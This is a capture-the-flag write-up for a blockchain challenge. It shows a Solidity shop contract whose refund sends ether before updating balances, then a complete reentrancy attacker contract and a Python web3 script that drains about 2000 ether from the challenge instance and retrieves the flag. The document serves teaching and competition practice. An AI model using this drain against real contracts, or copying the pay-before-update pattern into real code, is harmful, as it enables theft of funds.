# Shop

Category: BLOCKCHAIN

Points: 498

Solves: 42

>Welcome to the Shop! Just buy the flag for 1337 ETH! Too bad you don't have enough...

### TLDR

The refund function has a vulnerability where it first refund your money, then updates your item count. We can use a reentracy attack to call refund over and over again before our item count is updated. We can then buy the flag with the stolen funds. Detailed implementation below.

### Solution

#### Exploration

```sol
pragma solidity ^0.6.0;
contract Shop {
    uint[4] cost = [5 ether,11 ether,23 ether,1337 ether];
   uint[4] bought = [0,0,0,0];
    function reset() public payable {
        bought[0] = 0;
        bought[1] = 0;
        bought[2] = 0;
        bought[3] = 0;
    }
    constructor() public {
        reset();
    }

    function buy(uint item, uint quantity) public payable {
        require(0 <= item && item<= 3, "Item does not exist!");
        require(0 < quantity && quantity <= 10, "Cannot buy more than 10 at once!");
        require(msg.value == (cost[item] * quantity), "Payment error!");
        bought[item] = quantity;
    }

    function refund(uint item, uint quantity) public payable {
        require(0 <= item && item <= 3, "Item does not exist!");
        require(0 < quantity && quantity <= 10, "Cannot refund more than 10 at once!");
        require(bought[item] > 0, "You do not have that item!");
        require(bought[item] >= quantity, "Quantity is greater than amount!");
        msg.sender.call.value((cost[item] * quantity))("");
        bought[item] -= quantity;
    }

    function isChallSolved() public view returns (bool solved) {
        if (bought[3] > 0) {
            return true;
        }
        else {
            return false;
        }
    }

}
```

Looks like we are gonna do some smart contract hacking! Analyzing their contract, it seems to be a very basic shop implementation. There are 4 items to buy costing `5`, `11`, `23`, and `1337` ether respectively.

In `buy`, we can either buy 1 to 10 items of `0-4` and it checks wether we paid enough for them then our `bought` array is updated. 

In `refund`, we can select an item and amount to refund. It makes sure that we do have the item. If we do we are refunded the money, *then* the function updates the `bought` array.

Our goal is to buy the last item for `1337` ether, and `isChallSolved` will return True if that happens.

Let's also see what the netcat server does:

```bash
$ nc blockchain.n00bzUnit3d.xyz 39999
[1] Get an instance
[2] Get the flag
Choice: 1
contract address: 0x29F7A4D7f68eb86112067488159A37B1d27214AF
rpc-url: http://64.23.154.146:43617
Wallet private-key: 0xc96782691c26d069040d58230576001d6f258c112de7d651f71ff39a17a86f9d
Wallet address: 0xd07B36A030f453445C6df15f58a5181b0fa62413
Secret: a88da0697464c58df647d51d43bb9c32f78c4ff98bdcf7b248c56955955112b1
Please save the provided secret, it will be needed to get the flag
$ nc blockchain.n00bzUnit3d.xyz 39999
[1] Get an instance
[2] Get the flag
Choice: 2
Please enter the hash provided during deployment: a88da0697464c58df647d51d43bb9c32f78c4ff98bdcf7b248c56955955112b1
The challenge is not solved yet!
```

Ok, looks like it just gives us a challenge instance. We are given the address of the `shop` contract, address and key of our `wallet`, a rpc url to connect to the ethereum network, and a secret (I believe it's the root node of the merkel tree but this isn't important) we will use when we want to get the flag.

Since I was pretty new to blockchain, I decided to read a couple blogs and writeups to see if I could interact with the blockchain network at all. Eventually I was able to code up a simple node script to find how much ether the `shop` and my `wallet` had, and also was able to buy and refund items:

```js
const { ethers } = require("ethers");

const provider = new ethers.providers.JsonRpcProvider(`http://64.23.154.146:43617`) 
const address1 = '0x29F7A4D7f68eb86112067488159A37B1d27214AF' // contract
const address2 = '0xd07B36A030f453445C6df15f58a5181b0fa62413' // wallet
const privateKey = "0xc96782691c26d069040d58230576001d6f258c112de7d651f71ff39a17a86f9d"
const wallet = new ethers.Wallet(privateKey, provider)

const ABI = [
    "function buy(uint item, uint quantity) public payable",
    "function refund(uint item, uint quantity) public payable",
    "function isChallSolved() public view returns (bool solved)",
];

const contract = new ethers.Contract(address1, ABI, provider)
const contractWithWallet = contract.connect(wallet);

const main = async () => {
    const balance1 = await provider.getBalance(address1)
    console.log(`\nETH Balance of contract --> ${ethers.utils.formatEther(balance1)} ETH\n`)
    const balance2 = await provider.getBalance(address2)
    console.log(`\nETH Balance of wallet --> ${ethers.utils.formatEther(balance2)} ETH\n`)
}

const buy=async()=>{
    const tx=await contractWithWallet.buy(0,1,{value: ethers.utils.parseEther("5")});
    await tx.wait()
    console.log(tx)
    const balance1 = await provider.getBalance(address1)
    console.log(`\nETH Balance of contract --> ${ethers.utils.formatEther(balance1)} ETH\n`)
    const balance2 = await provider.getBalance(address2)
    console.log(`\nETH Balance of wallet --> ${ethers.utils.formatEther(balance2)} ETH\n`)
}

const refund=async()=>{
    const tx=await contractWithWallet.refund(0,1);
    await tx.wait()
    console.log(tx)
    const balance1 = await provider.getBalance(address1)
    console.log(`\nETH Balance of contract --> ${ethers.utils.formatEther(balance1)} ETH\n`)
    const balance2 = await provider.getBalance(address2)
    console.log(`\nETH Balance of wallet --> ${ethers.utils.formatEther(balance2)} ETH\n`)
}

// main()
// buy()
// refund()
```

```
ETH Balance of contract --> 2999.999350877388671875 ETH


ETH Balance of wallet --> 9.0 ETH
--------------------------------------------------------
ETH Balance of contract --> 3004.999350877388671875 ETH


ETH Balance of wallet --> 3.999900170574172744 ETH
--------------------------------------------------------
ETH Balance of contract --> 2999.999350877388671875 ETH


ETH Balance of wallet --> 8.999834918984774268 ETH
```

Cool, I was able to get a very basic connection with the network. It looks like the `shop` has `3000` ether while I only have `9`. Buying and refunding work as expected except for a tiny amout of wei lost from the gas used for processing the transactions.

Now that we've explored a bit, it's hacking time :sunglasses:

#### Exploitation

The main problem with this code is that in refund, we are first refunded the money then our item count is updated. This means that we can use a **reentracy attack**. Essentially, we can call refund multiple times, before our item count is updated. Since we get refunded multiple times, we stole the shops money. Since our wallet has `9` ether and the shop has `3000` ether. We can just buy the first item for `5` ether, then perform the attack (switching to buying more expensive stuff later for efficiency). If we do this a couple of time we can drain at least `1337` ether from the shop, and finally use that to buy the `1337` item.

Great, we have the main idea, but the hard part is actually coding this up :skull:, so sleeping after day 1 of the contest, I was ready to start researching the hell out of what to do on day 2. After reading a bunch of blog posts and articles, watching yt tutorials, and asking chatgpt. I was able to get a proof of concept working on [remix ide](remix.ethereum.org).

```sol
pragma solidity ^0.6.0;

// define what functions from shop we will use
interface Shop {
        function buy(uint256 item, uint256 quantity) external payable;
        function refund(uint256 item, uint256 quantity) external;
}

contract Attacker {
    address payable owner;
    Shop public shop;
    uint public val;

    constructor(address _victim) public payable {
        shop = Shop(_victim);
        val = 5 ether; // start attack with 5 ether
        owner = payable(msg.sender);
    }

    function attack() public payable {
        require(msg.value >= val, "gimme more monnies");
        // Perform the buy operation with value
        (bool successBuy, ) = address(shop).call.value(val)(abi.encodeWithSignature("buy(uint256,uint256)", 0, 1));
        shop.refund(0, 1);
    }
    
    /*
        Fallback function
    */
    receive() external payable {
        if (address(shop).balance >= 1 ether) {
          shop.refund(0, 1);
        }
    }

    // send stolen ether back to my wallet
    function sendFunds() public {
        owner.transfer(address(this).balance);
    }

    // check how much ether possessed for debugging
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

![Remix POC](/images/ShopRemix.png)
![Attack](/images/ShopRemixAttack.png)

Let's go through what each block does:
1. <span style="color:#ec51f7">interface</span>: defines syntax of function we will use from `shop` contract.
2. <span style="color:#ea4025">contructor</span>: initializes an attacker contract with a victim address (in this case the shop)
3. <span style="color:#f09737">attack</span>: starts the attack by buying then refunding an item
4. <span style="color:#fffb53">receive</span>: our fallback function that gets called everytime we get paid (refunded from the shop). In this case we attempt to refund recursively.
5. <span style="color:#72f54a">sendFunds</span>: sends ether stolen from the attacker contract back to wallet.
6. <span style="color:#74f8fd">getBalance</span>: displays current balance (for debugging/testing)

As you can see, we initialized an attacker contract with the address of `shop`. Then we use 5 ether to start the attack function. When we get refunded, the fallback function receive will ask for another refund. In the above example, we were able to steal 105 ether from the shop. (Make sure to give the shop ether before running the attack or else there is no money to steal). Finally, we can use `sendFunds` to give the 105 ether back to our wallet.

Ok, we can steal the shops money, now we just need to do it on the remote server :yum:

#### Implementation

Since javascript is a garbage language, I decided to switch to python and use the `web3` and `solcx` libraries. It was mostly read reading through a lot of documentation, stack overflow, and chatgpt, so I won't go into detail there but eventually I got the script to work. We connect to the network, compile our attacker script, deploy an attacker contract, run the attack function, send ether back to our wallet, and finally buy the `1337` item:

`attacker.sol`:

```sol
pragma solidity ^0.6.0;

// define what functions from shop we will use
interface Shop {
    function buy(uint256 item, uint256 quantity) external payable;
    function refund(uint256 item, uint256 quantity) external;
}

contract Attacker {
    address payable owner;
    Shop public shop;
    uint public val;
    uint public val2;
    bool public speed;

    constructor(address _victim) public payable {
        shop = Shop(_victim);
        val = 5 ether; // start attack with 5 ether
        val2 = 50 ether; // speed up attack after we stole enough ether
        owner = payable(msg.sender);
        speed = false;
    }

    function attack() public payable {
        require(msg.value >= val, "gimme more monnies");
        // Perform the buy operation with value
        
        // sped up attack
        if (msg.value > val2){
            (bool successBuy, ) = address(shop).call.value(val)(abi.encodeWithSignature("buy(uint256,uint256)", 0, 10));
            shop.refund(0, 10);
            speed = true;
        }
        // initial attack
        else {
            (bool successBuy, ) = address(shop).call.value(val)(abi.encodeWithSignature("buy(uint256,uint256)", 0, 1));
            shop.refund(0, 1);
        }
    }
    
    /*
        Fallback function
    */
    receive() external payable {
        /*
            comment out one of them depending on which step you are on
        */

        /* Step 1 */
        if (address(shop).balance >= 2900 ether) {
        shop.refund(0, 1);
        }

        // sped up attack to recover at least 1337 ether
        
        /* Step2 */
        if (address(shop).balance >= 1500 ){
            shop.refund(0, 10);
        }

    }

    // send stolen ether back to my wallet
    function sendFunds() public {
        owner.transfer(address(this).balance);
    }

    // check how much ether possessed for debugging
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

`exploit.py`:

```py
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from solcx import compile_source, install_solc, get_installable_solc_versions, get_installed_solc_versions, set_solc_version


# use install_solc if no version is installed
set_solc_version('0.6.0')

# Setup Web3 connection
provider_url = 'http://64.23.154.146:48594'
web3 = Web3(Web3.HTTPProvider(provider_url))

# Add POA middleware for private chains or testnets
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

# Define addresses and private key
contract_address = '0xc61AaFcb1334770b36D505e5f960c6494bd25aa1'
wallet_address = '0x8207C8F9346dB7f0bA8b7eEFd162b83f46F8Fc95'
private_key = '0x76c47a76053c8ebb0839a5b471ec0ddb3a9b8e92fdd7802d2209ba2a5d9f3977'

# Setup wallet and contract
wallet = Account.from_key(private_key)

# ABI definition
abi = [
    {"constant": False, "inputs": [{"name": "item", "type": "uint256"}, {"name": "quantity", "type": "uint256"}], "name": "buy", "outputs": [], "payable": True, "stateMutability": "payable", "type": "function"},
    {"constant": False, "inputs": [{"name": "item", "type": "uint256"}, {"name": "quantity", "type": "uint256"}], "name": "refund", "outputs": [], "payable": True, "stateMutability": "payable", "type": "function"},
    {"constant": True, "inputs": [], "name": "isChallSolved", "outputs": [{"name": "solved", "type": "bool"}], "payable": False, "stateMutability": "view", "type": "function"}
]

# Create contract instance
contract = web3.eth.contract(address=contract_address, abi=abi)

# Check ETH balances
def check_balances():
    balance1 = web3.eth.get_balance(contract_address)
    balance2 = web3.eth.get_balance(wallet_address)
    print(f"\nETH Balance of contract --> {web3.from_wei(balance1, 'ether')} ETH\n")
    print(f"\nETH Balance of wallet --> {web3.from_wei(balance2, 'ether')} ETH\n")

# Buy function
def buy(item):
    transaction = contract.functions.buy(item, 1).transact({'from':wallet_address,'value': web3.to_wei(['5','11','23','1337'][item], 'ether')})
    print(transaction)
    check_balances()

# Refund function
def refund(item):
    transaction = contract.functions.refund(item, 1).transact({'from':wallet_address})
    print(transaction)
    check_balances()


# Create attacker contract
attacker_source_code = open("attacker.sol").read()
compiled_sol = compile_source(attacker_source_code)
attacker_interface = compiled_sol['<stdin>:Attacker']
attacker_abi = attacker_interface['abi']
attacker_bytecode = attacker_interface['bin']
attacker_contract = web3.eth.contract(abi=attacker_abi, bytecode=attacker_bytecode)

transaction = {
    'from': wallet.address,
    'gas': 2000000,
    'gasPrice': web3.to_wei('20', 'gwei'),
    'nonce': web3.eth.get_transaction_count(wallet.address),
}

# Deploy the contract
tx_hash = attacker_contract.constructor(contract_address).transact(transaction)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

attacker_contract_address=tx_receipt.contractAddress
print('Contract deployed at address:', attacker_contract_address)

attacker_contract_instance = web3.eth.contract(address=attacker_contract_address, abi=attacker_abi)


# testing
# buy(0)
# refund(0)

check_balances()

# run these first (may need to run multiple times)
# attacker_contract_instance.functions.attack().transact({'from': wallet.address, 'value': web3.to_wei('6', 'ether')}) 
# attacker_contract_instance.functions.sendFunds().transact({'from': wallet.address})

# change receive function in attacker.sol

# run these second (may need to run multiple times)
# attacker_contract_instance.functions.attack().transact({'from': wallet.address, 'value': web3.to_wei('51', 'ether')})
# attacker_contract_instance.functions.sendFunds().transact({'from': wallet.address})

# run this when you have enough ether
# buy(3)

check_balances()

print(contract.functions.isChallSolved().call())
```

`output`:

```
Contract deployed at address: 0xBAE40D385476b445A6eB6baBF77c419d2093929C

ETH Balance of contract --> 2999.999350877388671875 ETH


ETH Balance of wallet --> 8.9758888 ETH


ETH Balance of contract --> 2899.999350877388671875 ETH


ETH Balance of wallet --> 108.97571124520142635 ETH

False
-------------------------------------------------------------------------
Contract deployed at address: 0x29D9784ff9D59329F1d47dedF59A4AB13592f3C1

ETH Balance of contract --> 2899.999350877388671875 ETH


ETH Balance of wallet --> 108.96368544520142635 ETH


ETH Balance of contract --> 999.999350877388671875 ETH


ETH Balance of wallet --> 2008.963450467450039426 ETH

False
-------------------------------------------------------------------------
ETH Balance of contract --> 999.999350877388671875 ETH


ETH Balance of wallet --> 2008.951424667450039426 ETH

b'\x8fd\xce\xeb\xfe\xcf\xa1I\r&R\xc3%r\xd5\xf7\x07!\x00wG%\xb4%\x96\xb4\xf6\xef\x03{Jg'

ETH Balance of contract --> 2336.999350877388671875 ETH


ETH Balance of wallet --> 671.951411260766097726 ETH

True
```

`flag`:

```bash
$ nc blockchain.n00bzUnit3d.xyz 39999
[1] Get an instance
[2] Get the flag
Choice: 2
Please enter the hash provided during deployment: 5d90ddf90411970e228e6f9a2201b6ba0b144479f1bfc073ccc67ba233afad57
Flag: n00bz{5h0uld_h4v3_sub7r4ct3d_f1r5t}
```

The code is very sloppy, and it took so so so long to debug but it's done. We finally solved the chal :smiling_imp:

This was definitely my favorite challenge by far. It was a very fun learning experience, and I hope to understand even more of blockchain in the future \:D


### Flag

```n00bz{5h0uld_h4v3_sub7r4ct3d_f1r5t}```